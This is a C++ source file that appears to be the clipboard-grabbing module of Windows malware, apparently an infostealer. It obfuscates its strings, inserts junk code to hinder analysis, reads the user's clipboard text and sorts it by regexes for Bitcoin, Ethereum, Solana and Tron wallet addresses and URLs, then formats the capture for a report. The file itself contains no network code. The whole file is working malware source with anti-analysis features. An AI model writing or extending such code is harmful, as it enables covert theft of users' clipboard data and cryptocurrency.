 #include "Clipboard.h"
#include "../utils/Config.h"
#include "../core/Obfuscation.h"
#include <windows.h>
#include <regex>
#include <sstream>
#include "../../DebugLog.h"
namespace Modules {
    ClipboardData Clipboard::Grab() {
        JUNK_CODE_SMALL
        SLOG("[*] Reading clipboard...");
        ClipboardData d;
        d.Type = S("Empty");
        if (!OpenClipboard(nullptr)) return d;
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* raw = (char*)GlobalLock(hData);
            if (raw) {
                std::string text(raw);
                GlobalUnlock(hData);
                d.Content = text.size() > 4096 ? text.substr(0, 4096) : text;
                if (std::regex_search(text, std::regex(S("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$")))) {
                    d.Type = S("CryptoAddress-BTC");   
                } else if (std::regex_search(text, std::regex(S("^bc1[a-z0-9]{6,87}$")))) {
                    d.Type = S("CryptoAddress-BTC-Bech32");  
                } else if (std::regex_search(text, std::regex(S("^0x[0-9a-fA-F]{40}$")))) {
                    d.Type = S("CryptoAddress-ETH");    
                } else if (std::regex_search(text, std::regex(S("^[1-9A-HJ-NP-Za-km-z]{32,44}$")))) {
                    d.Type = S("CryptoAddress-SOL");    
                } else if (std::regex_search(text, std::regex(S("^T[0-9A-Za-z]{33}$")))) {
                    d.Type = S("CryptoAddress-TRX");    
                } else if (std::regex_search(text, std::regex(S("https?://")))) {
                    d.Type = S("URL");
                } else if (!text.empty()) {
                    d.Type = S("Text");
                }
            }
        }
        CloseClipboard();
        // if (d.Type != S("Empty")) {
        //     SLOG("  [+] Clipboard captured. Type: %s", d.Type.c_str());
        // } else {
        //     SLOG("  [-] Clipboard is empty or inaccessible.");
        // }
        return d;
    }
    std::string Clipboard::Format(const ClipboardData& d) {
        std::stringstream ss;
        ss << S("Type    : ") << d.Type    << "\n";
        ss << S("Content : ") << d.Content << "\n";
        return ss.str();
    }
}
